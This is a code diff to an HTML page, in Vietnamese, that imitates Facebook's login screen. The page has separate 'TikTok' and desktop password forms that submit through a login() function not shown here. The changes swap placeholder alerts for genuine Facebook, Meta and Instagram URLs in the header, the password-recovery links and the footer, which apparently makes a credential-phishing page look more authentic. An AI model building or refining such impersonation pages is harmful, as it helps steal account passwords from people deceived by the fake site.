@@ -39,7 +39,7 @@
             margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: center; /* Căn giữa tiêu đề */
+            justify-content: center;
             position: relative;
         }
         .header-title {
@@ -340,12 +340,12 @@
 
     <div class="header">
         <div class="header-content">
-            <div class="header-title" onclick="showLogin()">facebook</div>
+            <div class="header-title" onclick="window.location.href='https://www.facebook.com/'">facebook</div>
             <div class="header-menu" onclick="toggleDropdown()">
                 <svg viewBox="0 0 24 24"><circle cx="12" cy="6" r="2" fill="#606770"/><circle cx="12" cy="12" r="2" fill="#606770"/><circle cx="12" cy="18" r="2" fill="#606770"/></svg>
             </div>
             <div class="dropdown-menu" id="dropdownMenu" style="display: none; position: absolute; right: 10px; top: 40px; background: #fff; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.15);">
-                <div style="padding: 8px 12px; font-size: 14px;" onclick="alert('Báo cáo đã được gửi!')">Báo cáo</div>
+                <div style="padding: 8px 12px; font-size: 14px;" onclick="window.location.href='https://www.facebook.com/help/contact/540977703751424'">Báo cáo</div>
                 <div style="padding: 8px 12px; font-size: 14px;" onclick="window.open(window.location.href, '_blank')">Mở trong trình duyệt</div>
                 <div style="padding: 8px 12px; font-size: 14px;" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Đã sao chép!'))">Sao chép liên kết</div>
             </div>
@@ -353,7 +353,7 @@
     </div>
     <div class="main-container">
         <div class="left-section">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="desktop-logo" onclick="showLogin()">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="desktop-logo" onclick="window.location.href='https://www.facebook.com/'">
             <div class="slogan">Kết nối với bạn bè, gia đình và những người khác mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận thông tin cập nhật.</div>
         </div>
         <!-- TikTok Login -->
@@ -364,7 +364,7 @@
             <input type="text" id="login-input-tiktok" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" placeholder="Mật khẩu">
             <button class="btn-primary" onclick="login('tiktok')">Đăng nhập</button>
-            <a href="#" class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</a>
+            <a href="https://www.facebook.com/recover/initiate/" class="forgot-password" target="_blank">Bạn quên mật khẩu ư?</a>
             <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
             <div class="back-button" onclick="showLogin()">Quay lại</div>
         </div>
@@ -373,7 +373,7 @@
             <input type="text" id="login-input-desktop" placeholder="Số di động hoặc email">
             <input type="password" id="password-desktop" placeholder="Mật khẩu">
             <button class="btn-primary" onclick="login('desktop')">Đăng nhập</button>
-            <a href="#" class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</a>
+            <a href="https://www.facebook.com/recover/initiate/" class="forgot-password" target="_blank">Bạn quên mật khẩu ư?</a>
             <div class="divider"></div>
             <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
             <div class="back-button" onclick="showLogin()">Quay lại</div>
@@ -411,53 +411,53 @@
     </div>
     <div class="footer-links-tiktok">
         <span class="meta-logo">∞ Meta</span>
-        <a href="#" onclick="showAbout()">Giới thiệu</a>
-        <a href="#" onclick="showHelp()">Trợ giúp</a>
-        <a href="#" onclick="alert('Chuyển đến Xem thêm')">Xem thêm</a>
+        <a href="https://about.facebook.com/" target="_blank">Giới thiệu</a>
+        <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
+        <a href="https://www.facebook.com/" target="_blank">Xem thêm</a>
     </div>
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-links">
-                <a href="#" onclick="alert('Chuyển đến Tiếng Việt')">Tiếng Việt</a>
-                <a href="#" onclick="alert('Chuyển đến English (US)')">English (US)</a>
-                <a href="#" onclick="alert('Chuyển đến Español')">Español</a>
-                <a href="#" onclick="alert('Chuyển đến Português (Brasil)')">Português (Brasil)</a>
-                <a href="#" onclick="alert('Chuyển đến Français (France)')">Français (France)</a>
-                <a href="#" onclick="alert('Chuyển đến Deutsch')">Deutsch</a>
-                <a href="#" onclick="alert('Chuyển đến Italiano')">Italiano</a>
-                <a href="#" onclick="alert('Chuyển đến العربية')">العربية</a>
-                <a href="#" onclick="alert('Chuyển đến 中文(简体)')">中文(简体)</a>
-                <a href="#" onclick="alert('Chuyển đến हिन्दी')">हिन्दी</a>
+                <a href="https://www.facebook.com/?locale=vi_VN" target="_blank">Tiếng Việt</a>
+                <a href="https://www.facebook.com/?locale=en_US" target="_blank">English (US)</a>
+                <a href="https://www.facebook.com/?locale=es_LA" target="_blank">Español</a>
+                <a href="https://www.facebook.com/?locale=pt_BR" target="_blank">Português (Brasil)</a>
+                <a href="https://www.facebook.com/?locale=fr_FR" target="_blank">Français (France)</a>
+                <a href="https://www.facebook.com/?locale=de_DE" target="_blank">Deutsch</a>
+                <a href="https://www.facebook.com/?locale=it_IT" target="_blank">Italiano</a>
+                <a href="https://www.facebook.com/?locale=ar_AR" target="_blank">العربية</a>
+                <a href="https://www.facebook.com/?locale=zh_CN" target="_blank">中文(简体)</a>
+                <a href="https://www.facebook.com/?locale=hi_IN" target="_blank">हिन्दी</a>
             </div>
             <div class="footer-links">
                 <a onclick="showLogin()">Đăng nhập</a>
                 <a onclick="showCreateAccount()">Đăng ký</a>
-                <a href="#" onclick="alert('Chuyển đến Messenger')">Messenger</a>
-                <a href="#" onclick="alert('Chuyển đến Facebook Lite')">Facebook Lite</a>
-                <a href="#" onclick="alert('Chuyển đến Watch')">Watch</a>
-                <a href="#" onclick="alert('Chuyển đến Địa điểm')">Địa điểm</a>
-                <a href="#" onclick="alert('Chuyển đến Trò chơi')">Trò chơi</a>
-                <a href="#" onclick="alert('Chuyển đến Marketplace')">Marketplace</a>
-                <a href="#" onclick="alert('Chuyển đến Meta Pay')">Meta Pay</a>
-                <a href="#" onclick="alert('Chuyển đến Meta Store')">Meta Store</a>
-                <a href="#" onclick="alert('Chuyển đến Meta Quest')">Meta Quest</a>
-                <a href="#" onclick="alert('Chuyển đến Instagram')">Instagram</a>
-                <a href="#" onclick="alert('Chuyển đến Threads')">Threads</a>
-                <a href="#" onclick="alert('Chuyển đến Quyên góp')">Quyên góp</a>
-                <a href="#" onclick="alert('Chuyển đến Dịch vụ')">Dịch vụ</a>
-                <a href="#" onclick="alert('Chuyển đến Trung tâm thông tin bầu cử')">Trung tâm thông tin bầu cử</a>
-                <a href="#" onclick="alert('Chuyển đến Chính sách quyền riêng tư')">Chính sách quyền riêng tư</a>
-                <a href="#" onclick="alert('Chuyển đến Trung tâm quyền riêng tư')">Trung tâm quyền riêng tư</a>
-                <a href="#" onclick="alert('Chuyển đến Nhóm')">Nhóm</a>
-                <a onclick="showAbout()">Giới thiệu</a>
-                <a href="#" onclick="alert('Chuyển đến Tạo quảng cáo')">Tạo quảng cáo</a>
-                <a href="#" onclick="alert('Chuyển đến Tạo Trang')">Tạo Trang</a>
-                <a href="#" onclick="alert('Chuyển đến Nhà phát triển')">Nhà phát triển</a>
-                <a href="#" onclick="alert('Chuyển đến Tuyển dụng')">Tuyển dụng</a>
-                <a href="#" onclick="alert('Chuyển đến Cookie')">Cookie</a>
-                <a href="#" onclick="alert('Chuyển đến Lựa chọn quảng cáo')">Lựa chọn quảng cáo</a>
-                <a href="#" onclick="alert('Chuyển đến Điều khoản')">Điều khoản</a>
-                <a onclick="showHelp()">Trợ giúp</a>
+                <a href="https://www.messenger.com/" target="_blank">Messenger</a>
+                <a href="https://www.facebook.com/lite/" target="_blank">Facebook Lite</a>
+                <a href="https://www.facebook.com/watch/" target="_blank">Watch</a>
+                <a href="https://www.facebook.com/places/" target="_blank">Địa điểm</a>
+                <a href="https://www.facebook.com/games/" target="_blank">Trò chơi</a>
+                <a href="https://www.facebook.com/marketplace/" target="_blank">Marketplace</a>
+                <a href="https://pay.facebook.com/" target="_blank">Meta Pay</a>
+                <a href="https://www.meta.com/" target="_blank">Meta Store</a>
+                <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
+                <a href="https://www.instagram.com/" target="_blank">Instagram</a>
+                <a href="https://www.threads.net/" target="_blank">Threads</a>
+                <a href="https://www.facebook.com/fundraisers/" target="_blank">Quyên góp</a>
+                <a href="https://www.facebook.com/biz/directory/" target="_blank">Dịch vụ</a>
+                <a href="https://www.facebook.com/votinginformationcenter/" target="_blank">Trung tâm thông tin bầu cử</a>
+                <a href="https://www.facebook.com/privacy/explanation/" target="_blank">Chính sách quyền riêng tư</a>
+                <a href="https://www.facebook.com/privacy/center/" target="_blank">Trung tâm quyền riêng tư</a>
+                <a href="https://www.facebook.com/groups/" target="_blank">Nhóm</a>
+                <a href="https://about.facebook.com/" target="_blank">Giới thiệu</a>
+                <a href="https://www.facebook.com/ads/create/" target="_blank">Tạo quảng cáo</a>
+                <a href="https://www.facebook.com/pages/creation/" target="_blank">Tạo Trang</a>
+                <a href="https://developers.facebook.com/" target="_blank">Nhà phát triển</a>
+                <a href="https://www.facebook.com/careers/" target="_blank">Tuyển dụng</a>
+                <a href="https://www.facebook.com/policies/cookies/" target="_blank">Cookie</a>
+                <a href="https://www.facebook.com/adpreferences/ad_settings" target="_blank">Lựa chọn quảng cáo</a>
+                <a href="https://www.facebook.com/policies/" target="_blank">Điều khoản</a>
+                <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
             </div>
             <div class="footer-meta">Meta © 2025</div>
         </div>
